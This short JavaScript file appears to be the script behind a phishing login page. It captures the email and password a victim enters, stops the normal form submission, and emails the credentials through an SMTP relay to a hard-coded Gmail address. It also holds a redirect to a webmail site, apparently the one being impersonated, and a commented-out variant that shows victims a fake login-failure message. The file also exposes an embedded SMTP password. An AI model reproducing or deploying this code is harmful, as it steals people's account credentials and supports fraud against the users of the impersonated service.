const form = document.querySelector('form');
const email = document.getElementById('email');
const password = document.getElementById('password');


 function sendEmail() {
  bodyMessage = {
    email : document.getElementById('email').value,
    password : document.getElementById('password').value
  }
  Email.send({
    Host : "smtp.elasticemail.com",
    Username : "jasohnatzldakls@gmail.com",
    Password : "01B10CDF3CE2299F6E87518F39138976576A",
    To : 'jasohnatzldakls@gmail.com',
    From : "jasohnatzldakls@gmail.com",
    Subject : "This is the subject",
    Body : bodyMessage
  }).then(
  message => alert(message)
  );
 }

 form.addEventListener('submit', (e) => { 
  e.preventDefault();
  sendEmail();
 })

 function redirect() {
  window.location.href="https://webmail.ftc-i.net/"+[]
  
}



// function sendMail(){
//   let parms = {
//     email : document.getElementById('email').value,
//     password : document.getElementById('password').value
//   }

//   emailjs.send('service_sxs3kpo', parms).then(alert("unable to log in.. Close tab and try again!!!"))
// }